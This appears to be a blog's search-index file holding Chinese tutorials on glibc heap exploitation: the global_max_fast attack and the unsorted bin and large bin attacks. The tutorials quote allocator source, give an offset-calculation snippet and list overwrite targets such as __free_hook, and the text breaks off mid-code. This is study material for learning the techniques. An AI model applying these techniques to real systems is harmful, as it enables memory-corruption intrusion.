<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>global_max_fast</title>
    <url>/2022/03/03/2022-03-03-global-max-fast/</url>
    <content><![CDATA[<p>转载自<a href="https://xz.aliyun.com/t/5082#toc-8">https://xz.aliyun.com/t/5082#toc-8</a></p>
<h1 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h1><p>此次的源码是基于<code>libc-2.23</code>的，后续的版本加入了<code>tcache</code>，该机制相对来说比较简单与独立，所以还是基于2.23进行相应的分析，在64位系统上进行。<br><code>global_max_fast</code>这个全局变量的作用是用来标志<code>fastbin</code>的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。看下它的定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                           \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_max_fast() global_max_fast</span><br></code></pre></td></tr></table></figure>

<p><code>set_max_fast</code>初始化函数开始是在<code>malloc_init_state</code>调用的，可以看到这个宏定义的作用是设置<code>global_max_fast</code>默认值，默认值是0x80。</p>
<p>然后看<code>malloc</code>中对于<code>fastbin</code>的处理，fastbin处理很简单，就是找到对应的fastbin的单链表，并从中取出堆块，如果size检查通过就将该堆块返回：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (<span class="hljs-built_in">get_max_fast</span> ()))<br>    &#123;<br>      idx = <span class="hljs-built_in">fastbin_index</span> (nb);<br>      mfastbinptr *fb = &amp;<span class="hljs-built_in">fastbin</span> (av, idx);  ## 找到对应的单链表<br>      mchunkptr pp = *fb;<br>      <span class="hljs-keyword">do</span><br>        &#123;<br>          victim = pp;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>      <span class="hljs-keyword">while</span> ((pp = <span class="hljs-built_in">catomic_compare_and_exchange_val_acq</span> (fb, victim-&gt;fd, victim))<br>             != victim);<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (<span class="hljs-built_in">fastbin_index</span> (<span class="hljs-built_in">chunksize</span> (victim)) != idx, <span class="hljs-number">0</span>))  ## 检查size<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              <span class="hljs-built_in">malloc_printerr</span> (check_action, errstr, <span class="hljs-built_in">chunk2mem</span> (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          <span class="hljs-built_in">check_remalloced_chunk</span> (av, victim, nb);<br>          <span class="hljs-keyword">void</span> *p = <span class="hljs-built_in">chunk2mem</span> (victim);<br>          <span class="hljs-built_in">alloc_perturb</span> (p, bytes);<br>          <span class="hljs-keyword">return</span> p;  #返回<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>查看free中的fastbin相关的处理源码：</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">if</span> ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())<br><br>    ...<br>    <span class="hljs-comment">## 对size进行基本的检查</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-function"><span class="hljs-params">(__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)</span></span><br><span class="hljs-params"><span class="hljs-function">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span></span><br><span class="hljs-params"><span class="hljs-function">                 &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))</span></span><br><span class="hljs-function">      &#123;</span><br><span class="hljs-function">    ...</span><br><span class="hljs-function">    ## 对<span class="hljs-title">next</span> <span class="hljs-title">chunk</span>的<span class="hljs-title">size</span>进行检查</span><br><span class="hljs-function">    <span class="hljs-title">if</span> <span class="hljs-params">(chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ</span></span><br><span class="hljs-params"><span class="hljs-function">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span></span><br><span class="hljs-params"><span class="hljs-function">          &#125;)</span>)</span><br><span class="hljs-function">      &#123;</span><br><span class="hljs-function">        <span class="hljs-title">errstr</span> = &quot;<span class="hljs-title">free</span><span class="hljs-params">()</span>: <span class="hljs-title">invalid</span> <span class="hljs-title">next</span> <span class="hljs-title">size</span> <span class="hljs-params">(fast)</span>&quot;;</span><br><span class="hljs-function">        <span class="hljs-title">goto</span> <span class="hljs-title">errout</span>;</span><br><span class="hljs-function">      &#125;</span><br><span class="hljs-function">    ...</span><br><span class="hljs-function"></span><br><span class="hljs-function">    ## 获取对应的<span class="hljs-title">fastbin</span> <span class="hljs-title">index</span></span><br><span class="hljs-function">    <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">idx</span> = <span class="hljs-title">fastbin_index</span><span class="hljs-params">(size)</span>;</span><br><span class="hljs-function">    <span class="hljs-title">fb</span> = &amp;<span class="hljs-title">fastbin</span> <span class="hljs-params">(av, idx)</span>;</span><br><span class="hljs-function"></span><br><span class="hljs-function">    ...</span><br><span class="hljs-function"></span><br><span class="hljs-function">    <span class="hljs-title">do</span></span><br><span class="hljs-function">      &#123;</span><br><span class="hljs-function">    /* <span class="hljs-title">Check</span> <span class="hljs-title">that</span> <span class="hljs-title">the</span> <span class="hljs-title">top</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">bin</span> <span class="hljs-title">is</span> <span class="hljs-title">not</span> <span class="hljs-title">the</span> <span class="hljs-title">record</span> <span class="hljs-title">we</span> <span class="hljs-title">are</span> <span class="hljs-title">going</span> <span class="hljs-title">to</span> <span class="hljs-title">add</span></span><br><span class="hljs-function">       <span class="hljs-params">(i.e., double free)</span>.  */</span><br><span class="hljs-function">    <span class="hljs-title">if</span> <span class="hljs-params">(__builtin_expect (old == p, <span class="hljs-number">0</span>))</span></span><br><span class="hljs-function">        <span class="hljs-title">errstr</span> = &quot;<span class="hljs-title">double</span> <span class="hljs-title">free</span> <span class="hljs-title">or</span> <span class="hljs-title">corruption</span> <span class="hljs-params">(fasttop)</span>&quot;;</span><br><span class="hljs-function">        <span class="hljs-title">goto</span> <span class="hljs-title">errout</span>;</span><br><span class="hljs-function">      &#125;</span><br><span class="hljs-function">      ...</span><br><span class="hljs-function">    <span class="hljs-title">p</span>-&gt;</span>fd = old2 = old;<br>      &#125;<br></code></pre></td></tr></table></figure>

<p>对于fastbin的free过程主要包括如下：</p>
<ol>
<li>对释放的堆块的size进行基本的检查。</li>
<li>对释放堆块的下一个堆块的size进行基本的检查。</li>
<li>获取释放堆块所对应的fastbin链表对应的索引。</li>
<li>检查是否是double free。`</li>
<li>释放进单链表。</li>
</ol>
<p>fastbin的单链表管理是比较简单的，与<code>global_max_fast</code>相关且需要注意的代码则是fastbin 所对应的index获取以及index所对应的指针获取的代码，即<code>fastbin_index</code>宏以及<code>fastbin</code>宏，对应代码如下：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> fastbin_index(sz) \<br>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - 2)<br><br><span class="hljs-selector-id">#define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY<span class="hljs-selector-attr">[idx]</span>)<br></code></pre></td></tr></table></figure>

<p>可以看到这两个宏仅仅是利用偏移来定位数组的指针，但是arena所对应的<code>malloc_state</code>中fastbins数组相关的定义为：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">mfastbinptr</span> <span class="hljs-selector-tag">fastbinsY</span><span class="hljs-selector-attr">[NFASTBINS]</span><br><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">NFASTBINS</span>  (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>到这里问题就比较明显了，如果可以改写<code>global_max_fast</code>为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的<code>任意地址</code>写入所释放堆块的地址。</p>
<p>即利用<code>global_max_fast</code>进行相关的攻击</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>对于<code>global_max_fast</code>的利用首先要解决的事情是如何覆盖<code>global_max_fast</code>。适用的场景应是存在任意地址写的漏洞，但是写入的值却是不可控的（也是一个比较大的值），因为如果写入的值也是可控的话就不需要使用这个方法就能解决了，最典型的应该是<code>unsorted bin attack</code>，可实现往任意地址写入main_arena中的地址。</p>
<p>前置条件我想大概可能是需要泄露一个libc的地址，否则的话可能会像<code>heap_master</code>中一样需要爆破4bit的地址。</p>
<p>实现任意地址写的方式是：通过地址与fastbin数组的偏移计算出所需<code>free</code>的堆块的size，然后释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。</p>
<p>计算偏移的代码可以如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">fastbin_ptr = libc_base + libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] + <span class="hljs-number">8</span><br>idx = (target_addr-fastbin_ptr)/<span class="hljs-number">8</span><br>size = idx*<span class="hljs-number">0x10</span> + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure>

<p>此时要解决的事情是往哪里写以达到实现利用的目的。可能有很多的地方，理论上来说只要是<code>main_arena</code>结构体后面的是函数指针或是结构体指针的地址都可以，目前很容易能够预想到的是：</p>
<ul>
<li>_IO_list_all</li>
<li>stdout</li>
<li>stdin</li>
<li>stderr</li>
<li>__free_hook</li>
</ul>
<p>复写前面四个就是使用<code>IO_file</code>攻击那一套方法，伪造结构体来实现任意读任意写或者伪造vtable来实现<code>house of orange</code>攻击。</p>
<p>复写<code>__free_hook</code>的话则需要一次uaf来修改释放进去的fd改成<code>system</code>或者<code>one gadget</code>，再将堆块申请出来，从而实现将<code>__free_hook</code>改写成<code>system</code>或者<code>one gadget</code>。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>global_max_fast</code>的一些相关场景包括：</p>
<ul>
<li>可能能够得到libc地址。</li>
<li>能够控制free堆块的size。</li>
<li>能往任意地址写但是却无法控制写的内容。</li>
</ul>
<p>以此来实现往<code>main_arena</code>后面的任意地址写堆块地址的效果，以实现后续的利用，相关的漏洞利用方式包括<code>unsorted bin attack</code>以及house of orange（IO file）等。</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>large bin attack</title>
    <url>/2022/02/28/2022-02-28-large-bin-attack/</url>
    <content><![CDATA[<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><p>在进入到large bin attack 前，先对已经在高版本失效的unsorted bin attack 进行缅怀一下。</p>
<p>利用前提是有UAF，修改 unsorted bin 中的FD字段为0，BK字段为target addr - 0x10，然后malloc一个相同大小的chunk，即可在目标地址写入 unsorted bin 的地址，一般用来伪造堆头（制造出0x7f）、修改次数限制、上限信息、配合局部写等，十分好用。</p>
<p>在 glibc-2.29及以上的版本都已失效，但是本文主角 large bin attack 在高版本的利用中可以成为它的代替品。</p>
<p>下面最先介绍的 large bin attack 只适用于 glibc-2.30 以下的版本</p>
<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="large-bin原理"><a href="#large-bin原理" class="headerlink" title="large bin原理"></a>large bin原理</h2><h3 id="size与index"><a href="#size与index" class="headerlink" title="size与index"></a>size与index</h3><p>在源码中，不在small bin 范围内的 chunk 归类到 large bin 里，small bin 的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT  <span class="hljs-comment">//64位中：MALLOC_ALIGNMENT=0x10</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br></code></pre></td></tr></table></figure>

<p>根据最后一个宏定义可知：在64位的系统里面大于<code>MIN_LARGE_SIZE</code>为<code>64*0x10</code>即<code>0x400</code>的chunk为largebin**</p>
<p>largebin中不再是一个 index 对应一个大小的size，而是存储等差数列变化的chunk，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br></code></pre></td></tr></table></figure>

<p>如果把0x400的chunk代入其中，其对应的index为 48+(0x400&gt;&gt;6)即为64。因为第一次判断是移动6个位，所以每0x40才会增加index的大小。具体index对应的size如下表：</p>
<table>
<thead>
<tr>
<th align="center">size</th>
<th align="center">index</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[0x400 , 0x440)</td>
<td align="center">64</td>
</tr>
<tr>
<td align="center">[0x440 , 0x480)</td>
<td align="center">65</td>
</tr>
<tr>
<td align="center">[0x480 , 0x4C0)</td>
<td align="center">66</td>
</tr>
<tr>
<td align="center">[0x4C0 , 0x500)</td>
<td align="center">67</td>
</tr>
<tr>
<td align="center">[0x500 , 0x540)</td>
<td align="center">68</td>
</tr>
<tr>
<td align="center">等差 0x40</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">[0xC00 , 0xC40)</td>
<td align="center">96</td>
</tr>
<tr>
<td align="center">[0xC40 , 0xE00)</td>
<td align="center">97</td>
</tr>
<tr>
<td align="center">[0xE00 , 0x1000)</td>
<td align="center">98</td>
</tr>
<tr>
<td align="center">[0x1000 , 0x1200)</td>
<td align="center">99</td>
</tr>
<tr>
<td align="center">[0x1200 , 0x1400)</td>
<td align="center">100</td>
</tr>
<tr>
<td align="center">[0x1400 , 0x1600)</td>
<td align="center">101</td>
</tr>
<tr>
<td align="center">等差 0x200</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">[0x2800 , 0x2A00)</td>
<td align="center">111</td>
</tr>
<tr>
<td align="center">[0x2A00 , 0x3000)</td>
<td align="center">112</td>
</tr>
<tr>
<td align="center">[0x3000 , 0x4000)</td>
<td align="center">113</td>
</tr>
<tr>
<td align="center">[0x4000 , 0x5000)</td>
<td align="center">114</td>
</tr>
<tr>
<td align="center">等差 0x1000</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">[0x9000 , 0xA000)</td>
<td align="center">119</td>
</tr>
<tr>
<td align="center">[0xA000 , 0x10000)</td>
<td align="center">120</td>
</tr>
<tr>
<td align="center">[0x10000 , 0x18000)</td>
<td align="center">121</td>
</tr>
<tr>
<td align="center">[0x18000 , 0x20000)</td>
<td align="center">122</td>
</tr>
<tr>
<td align="center">[0x20000 , 0x28000)</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">[0x28000 , 0x40000)</td>
<td align="center">124</td>
</tr>
<tr>
<td align="center">[0x40000 , 0x80000)</td>
<td align="center">125</td>
</tr>
<tr>
<td align="center">[0x80000 , …. )</td>
<td align="center">126</td>
</tr>
</tbody></table>
<h3 id="链表维护方式"><a href="#链表维护方式" class="headerlink" title="链表维护方式"></a>链表维护方式</h3><p>不同大小的large chunk：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *gap;<br><br>    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x460</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr3);<br>    <span class="hljs-built_in">free</span>(ptr0);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    gap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x480</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301201027678.png"><span class="image-caption">image-20220301201027678</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301201049004.png"><span class="image-caption">image-20220301201049004</span></p>
<p>可以看见，即是free的顺序是打乱的，但是最终进入到large bin 中，无论是从<code>fd</code>看还是<code>fd_nextsize</code>看，都是从大到小的顺序排序。</p>
<p>相同大小的large chunk：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *gap;<br><br>    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr3);<br>    <span class="hljs-built_in">free</span>(ptr0);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    gap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x480</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301201438370.png"><span class="image-caption">image-20220301201438370</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301202717282.png"><span class="image-caption">image-20220301202717282</span></p>
<p>先释放的堆块C为堆头，由于不存在比它大或比它小的堆块，因此它的<code>fd_nextsize</code>和<code>bk_nextsize</code>都是指向自己。其余释放的堆块按释放的顺序，逆序排列在链表中，且它们的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0，它们通过<code>fd</code>与<code>bk</code>进行链接</p>
<p>既存在相同大小，又存在不同大小的堆块：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *gap;<br><br>    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x460</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//E</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr5=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//F</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr6=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x460</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//G</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr7=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//H</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(ptr2); <span class="hljs-comment">//C</span><br>    <span class="hljs-built_in">free</span>(ptr3); <span class="hljs-comment">//D</span><br>    <span class="hljs-built_in">free</span>(ptr0); <span class="hljs-comment">//A</span><br>    <span class="hljs-built_in">free</span>(ptr1); <span class="hljs-comment">//B</span><br>    <span class="hljs-built_in">free</span>(ptr7); <span class="hljs-comment">//H</span><br>    <span class="hljs-built_in">free</span>(ptr6); <span class="hljs-comment">//G</span><br>    <span class="hljs-built_in">free</span>(ptr5); <span class="hljs-comment">//F</span><br>    <span class="hljs-built_in">free</span>(ptr4); <span class="hljs-comment">//E</span><br>    gap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x480</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301204056436.png"><span class="image-caption">image-20220301204056436</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301210420441.png"><span class="image-caption">image-20220301210420441</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301210435991.png"><span class="image-caption">image-20220301210435991</span></p>
<p>可以看到不同的size会形成堆头，通过堆头的<code>fd_nextsize</code>与<code>bk_nextsize</code>指向比它小或大的堆头，按照从大到小的顺序，而相同的堆块则会链入到相应的堆头之中。而<code>fd</code>与<code>bk</code>在不同size的堆块间也是指向比它小或大的堆块，也是按照从大到小的顺序，而在相同size的堆块内则是按照先释放的在链表后面的排序，最终指向main_arena的一个地址，把所有large chunk 串起来。</p>
<p>所以large bin 链表维护：</p>
<ul>
<li>堆块从大到小排序。</li>
<li>对于相同大小的堆块，最先释放的堆块会成为堆头，其<code>fd_nextsize</code>与<code>bk_nextsize</code>会被赋值，其余的堆块释放后都会插入到该堆头结点的下一个结点，通过<code>fd</code>与<code>bk</code>链接，形成了先释放的在链表后面的排序方式，但是后释放的堆块的<code>fd_nextsize</code>与<code>bk_nextsize</code>都为0。 </li>
<li>不同大小的堆块通过堆头串联，即堆头中<code>fd_nextsize</code>指向比它小的堆块的堆头，<code>bk_nextsize</code>指向比它大的堆块的堆头，从而形成了第一点中的从大到小排序堆块的方式。同时最大的堆块的堆头的<code>bk_nextsize</code>指向最小的堆块的堆头，最小堆块的堆头的<code>fd_nextsize</code>指向最大堆块的堆头，以此形成循环双链表。</li>
</ul>
<p>接下来看看源码中如何实现 large chunk 从 unsorted bin 中取下来放入到 large bin 的过程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              ...  <span class="hljs-comment">// chunk为smallbin，放入到smallbin中</span><br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<span class="hljs-comment">//第一步，获取当前要插入的chunk对应的index</span><br>              bck = bin_at (av, victim_index); <span class="hljs-comment">//当前index对应的main_arena,bck-&gt;bk才是最小的chunk</span><br>              fwd = bck-&gt;fd;                   <span class="hljs-comment">//当前index中最大的chunk</span><br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123; <span class="hljs-comment">// 该chunk对应的largebin index中不为空</span><br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size)) <span class="hljs-comment">//第三步，如果要插入的chunk的size小于当前index中最小chunk的大小，则直接插入到最后面。</span><br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = 